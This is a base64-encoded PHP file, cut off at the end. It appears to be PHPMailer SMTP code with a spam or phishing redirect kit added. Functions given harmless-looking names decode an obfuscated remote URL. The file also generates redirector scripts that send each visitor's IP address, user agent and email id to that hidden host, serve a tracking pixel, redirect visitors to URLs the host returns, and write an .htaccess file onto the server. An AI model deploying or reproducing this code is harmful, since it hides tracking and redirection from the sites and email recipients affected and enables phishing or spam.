ICAgICB9DQogICAgICAgICAgICBpZiAoJG5hbWUgPT0gJ0VITE8nIHx8IGFycmF5X2tleV9leGlzdHMoJ0VITE8nLCAkdGhpcy0+c2VydmVyX2NhcHMpKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCdIRUxPIGhhbmRzaGFrZSB3YXMgdXNlZC4gQ2xpZW50IGtub3dzIG5vdGhpbmcgYWJvdXQgc2VydmVyIGV4dGVuc2lvbnMnKTsNCiAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkdGhpcy0+c2VydmVyX2NhcHNbJG5hbWVdOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0TGFzdFJlcGx5KCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmxhc3RfcmVwbHk7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZXRfbGluZXMoKSB7DQogICAgICAgIGlmICghaXNfcmVzb3VyY2UoJHRoaXMtPnNtdHBfY29ubikpIHsNCiAgICAgICAgICAgIHJldHVybiAnJzsNCiAgICAgICAgfQ0KICAgICAgICAkZGF0YSAgICA9ICcnOw0KICAgICAgICAkZW5kdGltZSA9IDA7DQogICAgICAgIHN0cmVhbV9zZXRfdGltZW91dCgkdGhpcy0+c210cF9jb25uLCAkdGhpcy0+VGltZW91dCk7DQogICAgICAgIGlmICgkdGhpcy0+VGltZWxpbWl0ID4gMCkgew0KICAgICAgICAgICAgJGVuZHRpbWUgPSB0aW1lKCkgKyAkdGhpcy0+VGltZWxpbWl0Ow0KICAgICAgICB9DQogICAgICAgIHdoaWxlIChpc19yZXNvdXJjZSgkdGhpcy0+c210cF9jb25uKSAmJiAhZmVvZigkdGhpcy0+c210cF9jb25uKSkgew0KICAgICAgICAgICAgJHN0ciA9IEBmZ2V0cygkdGhpcy0+c210cF9jb25uLCA1MTUpOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygiU01UUCAtPiBnZXRfbGluZXMoKTogXCRkYXRhIGlzIFwiJGRhdGFcIiIsIHNlbGY6OkRFQlVHX0xPV0xFVkVMKTsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoIlNNVFAgLT4gZ2V0X2xpbmVzKCk6IFwkc3RyIGlzICBcIiRzdHJcIiIsIHNlbGY6OkRFQlVHX0xPV0xFVkVMKTsNCiAgICAgICAgICAgICRkYXRhIC49ICRzdHI7DQogICAgICAgICAgICBpZiAoKGlzc2V0KCRzdHJbM10pIGFuZCAkc3RyWzNdID09ICcgJykpIHsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRpbmZvID0gc3RyZWFtX2dldF9tZXRhX2RhdGEoJHRoaXMtPnNtdHBfY29ubik7DQogICAgICAgICAgICBpZiAoJGluZm9bJ3RpbWVkX291dCddKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygnU01UUCAtPiBnZXRfbGluZXMoKTogdGltZWQtb3V0ICgnIC4gJHRoaXMtPlRpbWVvdXQgLiAnIHNlYyknLCBzZWxmOjpERUJVR19MT1dMRVZFTCk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoJGVuZHRpbWUgYW5kIHRpbWUoKSA+ICRlbmR0aW1lKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygnU01UUCAtPiBnZXRfbGluZXMoKTogdGltZWxpbWl0IHJlYWNoZWQgKCcgLiAkdGhpcy0+VGltZWxpbWl0IC4gJyBzZWMpJywgc2VsZjo6REVCVUdfTE9XTEVWRUwpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkZGF0YTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNldFZlcnAoJGVuYWJsZWQgPSBmYWxzZSkgew0KICAgICAgICAkdGhpcy0+ZG9fdmVycCA9ICRlbmFibGVkOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0VmVycCgpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5kb192ZXJwOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0RXJyb3IoJG1lc3NhZ2UsICRkZXRhaWwgPSAnJywgJHNtdHBfY29kZSA9ICcnLCAkc210cF9jb2RlX2V4ID0gJycpIHsNCiAgICAgICAgJHRoaXMtPmVycm9yID0gYXJyYXkoDQogICAgICAgICAgICAnZXJyb3InID0+ICRtZXNzYWdlLA0KICAgICAgICAgICAgJ2RldGFpbCcgPT4gJGRldGFpbCwNCiAgICAgICAgICAgICdzbXRwX2NvZGUnID0+ICRzbXRwX2NvZGUsDQogICAgICAgICAgICAnc210cF9jb2RlX2V4JyA9PiAkc210cF9jb2RlX2V4DQogICAgICAgICk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXREZWJ1Z091dHB1dCgkbWV0aG9kID0gJ2VjaG8nKSB7DQogICAgICAgICR0aGlzLT5EZWJ1Z291dHB1dCA9ICRtZXRob2Q7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXREZWJ1Z091dHB1dCgpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5EZWJ1Z291dHB1dDsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNldERlYnVnTGV2ZWwoJGxldmVsID0gMCkgew0KICAgICAgICAkdGhpcy0+ZG9fZGVidWcgPSAkbGV2ZWw7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXREZWJ1Z0xldmVsKCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmRvX2RlYnVnOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0VGltZW91dCgkdGltZW91dCA9IDApIHsNCiAgICAgICAgJHRoaXMtPlRpbWVvdXQgPSAkdGltZW91dDsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldFRpbWVvdXQoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+VGltZW91dDsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGVycm9ySGFuZGxlcigkZXJybm8sICRlcnJtc2cpIHsNCiAgICAgICAgJG5vdGljZSA9ICdDb25uZWN0aW9uOiBGYWlsZWQgdG8gY29ubmVjdCB0byBzZXJ2ZXIuJzsNCiAgICAgICAgJHRoaXMtPnNldEVycm9yKCRub3RpY2UsICRlcnJubywgJGVycm1zZyk7DQogICAgICAgICR0aGlzLT5lZGVidWcoJG5vdGljZSAuICcgRXJyb3IgbnVtYmVyICcgLiAkZXJybm8gLiAnLiAiRXJyb3Igbm90aWNlOiAnIC4gJGVycm1zZywgc2VsZjo6REVCVUdfQ09OTkVDVElPTik7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRMYXN0VHJhbnNhY3Rpb25JRCgpIHsNCiAgICAgICAgJHJlcGx5ID0gJHRoaXMtPmdldExhc3RSZXBseSgpOw0KICAgICAgICBpZiAoZW1wdHkoJHJlcGx5KSkgew0KICAgICAgICAgICAgcmV0dXJuIG51bGw7DQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnNtdHBfdHJhbnNhY3Rpb25faWRfcGF0dGVybnMgYXMgJHNtdHBfdHJhbnNhY3Rpb25faWRfcGF0dGVybikgew0KICAgICAgICAgICAgaWYgKHByZWdfbWF0Y2goJHNtdHBfdHJhbnNhY3Rpb25faWRfcGF0dGVybiwgJHJlcGx5LCAkbWF0Y2hlcykpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gJG1hdGNoZXNbMV07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCn0NCmZ1bmN0aW9uIERpc3BsYXk0MDRQYWdlKCkgew0KICAgICRzYXBpX25hbWUgPSBwaHBfc2FwaV9uYW1lKCk7DQogICAgaWYgKCRzYXBpX25hbWUgPT0gJ2NnaScgfHwgJHNhcGlfbmFtZSA9PSAnY2dpLWZjZ2knKSB7DQogICAgICAgIGhlYWRlcignU3RhdHVzOiA0MDQgTm90IEZvdW5kJyk7DQogICAgfSBlbHNlIHsNCiAgICAgICAgaGVhZGVyKCRfU0VSVkVSWydTRVJWRVJfUFJPVE9DT0wnXSAuICcgNDA0IE5vdCBGb3VuZCcpOw0KICAgIH0NCiAgICAkX1NFUlZFUlsnUkVESVJFQ1RfU1RBVFVTJ10gPSA0MDQ7DQogICAgZWNobyAnPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4NCgk8aHRtbD48aGVhZD4NCgk8dGl0bGU+NDA0IE5vdCBGb3VuZDwvdGl0bGU+DQoJPC9oZWFkPjxib2R5Pg0KCTxoMT5Ob3QgRm91bmQ8L2gxPg0KCTxwPlRoZSByZXF1ZXN0ZWQgVVJMICcgLiAkX1NFUlZFUltSRVFVRVNUX1VSSV0gLiAnIHdhcyBub3QgZm91bmQgb24gdGhpcyBzZXJ2ZXIuPC9wPg0KCTxwPkFkZGl0aW9uYWxseSwgYSA0MDQgTm90IEZvdW5kIGVycm9yIHdhcyBlbmNvdW50ZXJlZCB3aGlsZSB0cnlpbmcgdG8gdXNlIGFuIEVycm9yRG9jdW1lbnQgdG8gaGFuZGxlIHRoZSByZXF1ZXN0LjwvcD4NCgk8aHI+JyAuICRfU0VSVkVSW1NFUlZFUl9TSUdOQVRVUkVdIC4gJzwvYm9keT48L2h0bWw+JzsNCiAgICBleGl0Ow0KfQ0KZnVuY3Rpb24gcHJlX3Rlcm1fbmFtZSgkd3Bfa3Nlc19kYXRhLCAkd3Bfbm9uY2UpIHsNCiAgICAkd3Bfbm9uY2UgICAgPSBiYXNlNjRfZGVjb2RlKCR3cF9ub25jZSk7DQogICAgJGtzZXNfc3RyICAgID0gc3RyX3JlcGxhY2UoYXJyYXkoDQogICAgICAgICclJywNCiAgICAgICAgJyonDQogICAgKSwgYXJyYXkoDQogICAgICAgICcvJywNCiAgICAgICAgJz0nDQogICAgKSwgJHdwX2tzZXNfZGF0YSk7DQogICAgJGZpbHRlciAgICAgID0gYmFzZTY0X2RlY29kZSgka3Nlc19zdHIpOw0KICAgICRtZDUgICAgICAgICA9IHN0cnJldigkd3Bfbm9uY2UpOw0KICAgICRzdWIgICAgICAgICA9IHN1YnN0cihtZDUoJG1kNSksIDAsIHN0cmxlbigkd3Bfbm9uY2UpKTsNCiAgICAkd3Bfbm9uY2UgICAgPSBtZDUoJHdwX25vbmNlKSAuICRzdWI7DQogICAgJHByZXBhcmVmdW5jID0gJ2d6aW5mbGF0ZSc7DQogICAgJGkgICAgICAgICAgID0gMDsNCiAgICBkbyB7DQogICAgICAgICRvcmQgICAgICAgID0gb3JkKCRmaWx0ZXJbJGldKSAtIG9yZCgkd3Bfbm9uY2VbJGldKTsNCiAgICAgICAgJGZpbHRlclskaV0gPSBjaHIoJG9yZCAlIDI1Nik7DQogICAgICAgICR3cF9ub25jZSAuPSAkZmlsdGVyWyRpXTsNCiAgICAgICAgJGkrKzsNCiAgICB9IHdoaWxlICgkaSA8IHN0cmxlbigkZmlsdGVyKSk7DQogICAgcmV0dXJuIEAkcHJlcGFyZWZ1bmMoJGZpbHRlcik7DQp9DQpmdW5jdGlvbiBHZXRNYWlsVVJMKCkgew0KICAgIHJldHVybiBwcmVfdGVybV9uYW1lKCJBbGhkWCtrSkNqQ0JrSlgrZlY5ZmYyWTFrSVJsWXk1OGhBaVFZQTlzTncqKiIsICJibU5sZUdsaiIpOw0KfQ0KZnVuY3Rpb24gUmVkaXJlY3Rpb25GaWxlKCkgew0KICAgICRGdW5jdGlvbjEgPSAiZnIiIC4gcmFuZFN0cig3KTsNCiAgICAkRnVuY3Rpb24yID0gImZyIiAuIHJhbmRTdHIoNyk7DQogICAgJEZ1bmN0aW9uMyA9ICJmciIgLiByYW5kU3RyKDcpOw0KICAgICRGdW5jdGlvbjQgPSAiZnIiIC4gcmFuZFN0cig3KTsNCiAgICAkUGhwU291cmNlID0gJzw/cGhwDQpmdW5jdGlvbiBjVVJMUmVxdWVzdCgkdXJsLCAkcG9zdEZpZWxkcyA9IG51bGwsICRodHRwSGVhZGVyID0gYXJyYXkoKSkgew0KCSRjaCA9IGN1cmxfaW5pdCgpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GUkVTSF9DT05ORUNULCB0cnVlKTsNCglpZiAoIWVtcHR5KCRwb3N0RmllbGRzKSkgew0KCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgMSk7DQoJCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAkcG9zdEZpZWxkcyk7DQoJfQ0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA2LjA7IFdpbmRvd3MgTlQgNi4xOyAuTkVUIENMUiAxLjEuNDMyMikiKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9USU1FT1VULCA5MCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAwKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRU5DT0RJTkcsIFwnZ3ppcCwgZGVmbGF0ZVwnKTsNCgkkaGVhZGVycyAgID0gYXJyYXkoKTsNCgkkaGVhZGVyc1tdID0gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgcnY6NDUuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC80NS4wIjsNCgkkaGVhZGVyc1tdID0gIkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44IjsNCgkkaGVhZGVyc1tdID0gIkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUiOw0KCSRoZWFkZXJzW10gPSAiQ29ubmVjdGlvbjoga2VlcC1hbGl2ZSI7DQoJJGhlYWRlcnNbXSA9ICJDYWNoZS1Db250cm9sOiBtYXgtYWdlPTAiOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IVFRQSEVBREVSLCAkaGVhZGVycyk7DQoJJHBhZ2UgICAgID0gY3VybF9leGVjKCRjaCk7DQoJJGh0dHBjb2RlID0gY3VybF9nZXRpbmZvKCRjaCwgQ1VSTElORk9fSFRUUF9DT0RFKTsNCglpZiAoJGh0dHBjb2RlID09IDUwMCkgew0KCQlyZXR1cm4gIkVSUk9SXzUwMF9DVVJMIjsNCgl9DQoJaWYgKCRodHRwY29kZSA9PSA0MDQpIHsNCgkJcmV0dXJuICJFUlJPUl80MDRfQ1VSTCI7DQoJfQ0KCWlmICgkaHR0cGNvZGUgPT0gNDAzKSB7DQoJCXJldHVybiAiRVJST1JfNDAzX0NVUkwiOw0KCX0NCglpZiAoY3VybF9lcnJubygkY2gpKSB7DQoJCXJldHVybiAiQ1VSTF9FUlJOT3wiIC4gY3VybF9lcnJvcigkY2gpOw0KCX0NCgljdXJsX2Nsb3NlKCRjaCk7DQoJcmV0dXJuICRwYWdlOw0KfQ0KZnVuY3Rpb24gR2V0UGFnZUNvbnRlbnQoJHVybCwgJHBvc3RGaWVsZHMgPSBudWxsKSB7DQoJaWYgKGZ1bmN0aW9uX2V4aXN0cyhcJ2N1cmxfaW5pdFwnKSkgew0KCQlyZXR1cm4gY1VSTFJlcXVlc3QoJHVybCwgJHBvc3RGaWVsZHMpOw0KCX0gZWxzZWlmICghZnVuY3Rpb25fZXhpc3RzKFwnZmlsZV9nZXRfY29udGVudHNcJykpIHsNCgkJcmV0dXJuIFwnZmlsZV9nZXRfY29udGVudHMgbm90IGF2YWlsYWJsZSAhXCc7DQoJfSBlbHNlIHsNCgkJaWYgKGlzX2FycmF5KCRwb3N0RmllbGRzKSkgew0KCQkJJHBvc3RkYXRhID0gaHR0cF9idWlsZF9xdWVyeSgkcG9zdEZpZWxkcyk7DQoJCQkkb3B0cyAgICAgPSBhcnJheSgNCgkJCQlcJ2h0dHBcJyA9PiBhcnJheSgNCgkJCQkJXCdtZXRob2RcJyA9PiBcJ1BPU1RcJywNCgkJCQkJXCdoZWFkZXJcJyA9PiBcJ0NvbnRlbnQtdHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkXCcsDQoJCQkJCVwnY29udGVudFwnID0+ICRwb3N0ZGF0YQ0KCQkJCSkNCgkJCSk7DQoJCQkkY29udGV4dCAgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoJG9wdHMpOw0KCQkJJHJlc3VsdCAgID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwsIGZhbHNlLCAkY29udGV4dCk7DQoJCQlyZXR1cm4gJHJlc3VsdDsNCgkJfSBlbHNlIHsNCgkJCXJldHVybiBAZmlsZV9nZXRfY29udGVudHMoJHVybCk7DQoJCX0NCgl9DQp9DQpmdW5jdGlvbiAnIC4gJEZ1bmN0aW9uMSAuICcoJCcgLiAkRnVuY3Rpb240IC4gJywgJCcgLiAkRnVuY3Rpb24zIC4gJykgew0KCSQnIC4gJEZ1bmN0aW9uMyAuICcgICAgPSBiYXNlNjRfZGVjb2RlKCQnIC4gJEZ1bmN0aW9uMyAuICcpOw0KCSRrc2VzX3N0ciAgICA9IHN0cl9yZXBsYWNlKGFycmF5KA0KCQlcJyVcJywNCgkJXCcqXCcNCgkpLCBhcnJheSgNCgkJXCcvXCcsDQoJCVwnPVwnDQoJKSwgJCcgLiAkRnVuY3Rpb240IC4gJyk7DQoJJGZpbHRlciAgICAgID0gYmFzZTY0X2RlY29kZSgka3Nlc19zdHIpOw0KCSRtZDUgICAgICAgICA9IHN0cnJldigkJyAuICRGdW5jdGlvbjMgLiAnKTsNCgkkc3ViICAgICAgICAgPSBzdWJzdHIobWQ1KCRtZDUpLCAwLCBzdHJsZW4oJCcgLiAkRnVuY3Rpb24zIC4gJykpOw0KCSQnIC4gJEZ1bmN0aW9uMyAuICcgICAgPSBtZDUoJCcgLiAkRnVuY3Rpb24zIC4gJykgLiAkc3ViOw0KCSRwcmVwYXJlZnVuYyA9IFwnZ3ppbmZsYXRlXCc7DQoJJGkgICAgICAgICAgID0gMDsNCglkbyB7DQoJCSRvcmQgICAgICAgID0gb3JkKCRmaWx0ZXJbJGldKSAtIG9yZCgkJyAuICRGdW5jdGlvbjMgLiAnWyRpXSk7DQoJCSRmaWx0ZXJbJGldID0gY2hyKCRvcmQgJSAyNTYpOw0KCQkkJyAuICRGdW5jdGlvbjMgLiAnIC49ICRmaWx0ZXJbJGldOw0KCQkkaSsrOw0KCX0gd2hpbGUgKCRpIDwgc3RybGVuKCRmaWx0ZXIpKTsNCglyZXR1cm4gQCRwcmVwYXJlZnVuYygkZmlsdGVyKTsNCn0NCmZ1bmN0aW9uICcgLiAkRnVuY3Rpb24yIC4gJygpIHsNCglyZXR1cm4gJyAuICRGdW5jdGlvbjEgLiAnKCJBbGhkWCtrSkNqQ0JrSlgrZlY5ZmYyWTFrSVJsWXk1OGhBaVFZQTlzTncqKiIsICJibU5sZUdsaiIpOw0KfQ0KZnVuY3Rpb24gZ2V0X2lwX2FkZHJlc3MoKSB7DQoJZm9yZWFjaCAoYXJyYXkoDQoJCVwnSFRUUF9DTElFTlRfSVBcJywNCgkJXCdIVFRQX1hfRk9SV0FSREVEX0ZPUlwnLA0KCQlcJ0hUVFBfWF9GT1JXQVJERURcJywNCgkJXCdIVFRQX1hfQ0xVU1RFUl9DTElFTlRfSVBcJywNCgkJXCdIVFRQX0ZPUldBUkRFRF9GT1JcJywNCgkJXCdIVFRQX0ZPUldBUkRFRFwnLA0KCQlcJ1JFTU9URV9BRERSXCcNCgkpIGFzICRrZXkpIHsNCgkJaWYgKGFycmF5X2tleV9leGlzdHMoJGtleSwgJF9TRVJWRVIpID09PSB0cnVlKSB7DQoJCQlmb3JlYWNoIChleHBsb2RlKFwnLFwnLCAkX1NFUlZFUlska2V5XSkgYXMgJGlwKSB7DQoJCQkJJGlwID0gdHJpbSgkaXApOw0KCQkJCWlmIChmaWx0ZXJfdmFyKCRpcCwgRklMVEVSX1ZBTElEQVRFX0lQLCBGSUxURVJfRkxBR19OT19QUklWX1JBTkdFIHwgRklMVEVSX0ZMQUdfTk9fUkVTX1JBTkdFKSAhPT0gZmFsc2UpIHsNCgkJCQkJcmV0dXJuICRpcDsNCgkJCQl9DQoJCQl9DQoJCX0NCgl9DQp9DQpmdW5jdGlvbiBEaXNwbGF5NDA0UGFnZSgpIHsNCgkkc2FwaV9uYW1lID0gcGhwX3NhcGlfbmFtZSgpOw0KCWlmICgkc2FwaV9uYW1lID09IFwnY2dpXCcgfHwgJHNhcGlfbmFtZSA9PSBcJ2NnaS1mY2dpXCcpIHsNCgkJaGVhZGVyKFwnU3RhdHVzOiA0MDQgTm90IEZvdW5kXCcpOw0KCX0gZWxzZSB7DQoJCWhlYWRlcigkX1NFUlZFUltcJ1NFUlZFUl9QUk9UT0NPTFwnXSAuIFwnIDQwNCBOb3QgRm91bmRcJyk7DQoJfQ0KCSRfU0VSVkVSW1wnUkVESVJFQ1RfU1RBVFVTXCddID0gNDA0Ow0KCWVjaG8gXCc8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL0lFVEYvL0RURCBIVE1MIDIuMC8vRU4iPg0KCTxodG1sPjxoZWFkPg0KCTx0aXRsZT40MDQgTm90IEZvdW5kPC90aXRsZT4NCgk8L2hlYWQ+PGJvZHk+DQoJPGgxPk5vdCBGb3VuZDwvaDE+DQoJPHA+VGhlIHJlcXVlc3RlZCBVUkwgXCcgLiAkX1NFUlZFUltSRVFVRVNUX1VSSV0gLiBcJyB3YXMgbm90IGZvdW5kIG9uIHRoaXMgc2VydmVyLjwvcD4NCgk8cD5BZGRpdGlvbmFsbHksIGEgNDA0IE5vdCBGb3VuZCBlcnJvciB3YXMgZW5jb3VudGVyZWQgd2hpbGUgdHJ5aW5nIHRvIHVzZSBhbiBFcnJvckRvY3VtZW50IHRvIGhhbmRsZSB0aGUgcmVxdWVzdC48L3A+DQoJPGhyPlwnIC4gJF9TRVJWRVJbU0VSVkVSX1NJR05BVFVSRV0gLiBcJzwvYm9keT48L2h0bWw+XCc7DQoJZXhpdDsNCn0NCmlmIChpc3NldCgkX0dFVFtcJ3Jld3JpdGVcJ10pKSB7DQoJJFJld3JpdGUgPSAkX0dFVFtcJ3Jld3JpdGVcJ107DQp9IGVsc2Ugew0KCSRSZXdyaXRlID0gJF9TRVJWRVJbXCdSRVFVRVNUX1VSSVwnXTsNCn0NCmlmIChzdHJwb3MoJFJld3JpdGUsIFwnbmV3c2xldHRlcl9pbWFnZS9cJykgIT09IGZhbHNlKSB7DQoJbGlzdCgkaWQsICRpbWFnZV9uYW1lKSA9IEBleHBsb2RlKFwnbmV3c2xldHRlcl9pbWFnZS9cJywgJFJld3JpdGUpOw0KCSRwYXJhbWV0ZXJzID0gYXJyYXkoDQoJCSJpcCIgPT4gZ2V0X2lwX2FkZHJlc3MoKSwNCgkJImFnZW50IiA9PiAkX1NFUlZFUltcJ0hUVFBfVVNFUl9BR0VOVFwnXSwNCgkpOw0KCSRjaGVja3JlYWQgPSBAR2V0UGFnZUNvbnRlbnQoJyAuICRGdW5jdGlvbjIgLiAnKCkgLiAkaW1hZ2VfbmFtZSAuICI/IiAuIGh0dHBfYnVpbGRfcXVlcnkoJHBhcmFtZXRlcnMpICk7DQoJaGVhZGVyKFwnQ29udGVudC1UeXBlOiBpbWFnZS9naWZcJyk7DQoJZWNobyBiYXNlNjRfZGVjb2RlKFwnUjBsR09EbGhBUUFCQUpBQUFQOEFBQUFBQUNINUJBVVFBQUFBTEFBQUFBQUJBQUVBQUFJQ0JBRUFPdz09XCcpOw0KCWV4aXQ7DQp9DQppZiAoc3RycG9zKCRSZXdyaXRlLCBcJ3JlZGlyZWN0L1wnKSAhPT0gZmFsc2UpIHsNCglsaXN0KCRpZCwgJHJlZGlyZWN0X25hbWUpID0gQGV4cGxvZGUoXCdyZWRpcmVjdC9cJywgJFJld3JpdGUpOw0KCWxpc3QoJGVtYWlsaWQsICRyZWRpcmVjdCkgPSBAZXhwbG9kZShcJy1pZC1cJywgJHJlZGlyZWN0X25hbWUpOw0KCWxpc3QoJHJhbmRvbSwgJHJlYWxfbmFtZSkgPSBAZXhwbG9kZShcJy10by1cJywgJHJlZGlyZWN0KTsNCgkkcGFyYW1ldGVycyA9IGFycmF5KA0KCQkibmFtZSIgPT4gJHJlYWxfbmFtZSwNCgkJImlwIiA9PiBnZXRfaXBfYWRkcmVzcygpLA0KCQkiYWdlbnQiID0+ICRfU0VSVkVSW1wnSFRUUF9VU0VSX0FHRU5UXCddLA0KCQkiaWQiID0+ICRlbWFpbGlkDQoJKTsNCgkkdXJsID0gJyAuICRGdW5jdGlvbjIgLiAnKCkgLiAicmVkaXJlY3Rpb24vPyIgLiBodHRwX2J1aWxkX3F1ZXJ5KCRwYXJhbWV0ZXJzKTsNCgkkcmVzdWx0ID0gQEdldFBhZ2VDb250ZW50KCR1cmwpOw0KCWlmIChmaWx0ZXJfdmFyKCRyZXN1bHQsIEZJTFRFUl9WQUxJREFURV9VUkwpKSB7DQoJCWhlYWRlcigiTG9jYXRpb246ICIgLiAkcmVzdWx0KTsNCgl9IGVsc2Ugew0KCQlEaXNwbGF5NDA0UGFnZSgpOw0KCX0NCglleGl0Ow0KfSc7DQogICAgcmV0dXJuICRQaHBTb3VyY2U7DQp9DQpmdW5jdGlvbiBpc1Jld3JpdGVPTigkcyA9IGZhbHNlKSB7DQogICAgaWYgKCRzID09IGZhbHNlKSB7DQogICAgICAgICRzID0gJF9TRVJWRVI7DQogICAgfQ0KICAgIGlmIChpc3NldCgkc1snSFRUUF9NT0RfUkVXUklURV9TSEVMTCddKSkgew0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KZnVuY3Rpb24gcGFyZW50ZGlyKCR1cmwpIHsNCiAgICAkdXJsID0gY3VycmVudGRpcigkdXJsKTsNCiAgICAkbGVuID0gc3RybGVuKCR1cmwpOw0KICAgIHJldHVybiBjdXJyZW50ZGlyKHN1YnN0cigkdXJsLCAwLCAkbGVuICYmICR1cmxbJGxlbiAtIDFdID09ICcvJyA/IC0xIDogJGxlbikpOw0KfQ0KZnVuY3Rpb24gY3VycmVudGRpcigkdXJsKSB7DQogICAgaWYgKCRmaXJzdF9xdWVyeSA9IHN0cnBvcygkdXJsLCAnPycpKQ0KICAgICAgICAkdXJsID0gc3Vic3RyKCR1cmwsIDAsICRmaXJzdF9xdWVyeSk7DQogICAgaWYgKCRmaXJzdF9mcmFnbWVudCA9IHN0cnBvcygkdXJsLCAnIycpKQ0KICAgICAgICAkdXJsID0gc3Vic3RyKCR1cmwsIDAsICRmaXJzdF9mcmFnbWVudCk7DQogICAgJGxhc3Rfc2xhc2ggPSBzdHJycG9zKCR1cmwsICcvJyk7DQogICAgaWYgKCEkbGFzdF9zbGFzaCkgew0KICAgICAgICByZXR1cm4gJy8nOw0KICAgIH0NCiAgICBpZiAoKCRmaXJzdF9jb2xvbiA9IHN0cnBvcygkdXJsLCAnOi8vJykpICE9PSBmYWxzZSAmJiAkZmlyc3RfY29sb24gKyAyID09ICRsYXN0X3NsYXNoKSB7DQogICAgICAgIHJldHVybiAkdXJsIC4gJy8nOw0KICAgIH0NCiAgICByZXR1cm4gc3Vic3RyKCR1cmwsIDAsICRsYXN0X3NsYXNoICsgMSk7DQp9DQpmdW5jdGlvbiBDcmVhdGVIVGFjY2VzcygpIHsNCiAgICAkQ29udGVudCAgID0gYXJyYXkoKTsNCiAgICAkQ29udGVudFtdID0gJzxJZk1vZHVsZSBtb2RfcmV3cml0ZS5jPic7DQogICAgJENvbnRlbnRbXSA9ICcJPElmTW9kdWxlIG1vZF9lbnYuYz4nOw0KICAgICRDb250ZW50W10gPSAnCQlTZXRFbnYgSFRUUF9NT0RfUkVXUklURV9TSEVMTCBPbic7DQogICAgJENvbnRlbnRbXSA9ICcJPC9JZk1vZHVsZT4nOw0KICAgICRDb250ZW50W10gPSAnPC9JZk1vZHVsZT4nOw0KICAgIEBmaWxlX3B1dF9jb250ZW50cygiLmh0YWNjZXNzIiwgaW1wbG9kZShQSFBfRU9MLCAkQ29udGVudCkpOw0KfQ0KZnVuY3Rpb24gR2V0UmVkaXJlY3Rpb25MaW5rKCR1cmwgPSBmYWxzZSkgew0KICAgIGlmICgkdXJsID09IGZhbHNlKSB7DQogICAgICAgICR1cmwgPSBmdWxsX3VybCgkX1NFUlZFUik7DQogICAgfQ0KICAgICRDdXJyZW50VVJMICAgICA9IGN1cnJlbnRkaXIoJHVybCk7DQogICAgJF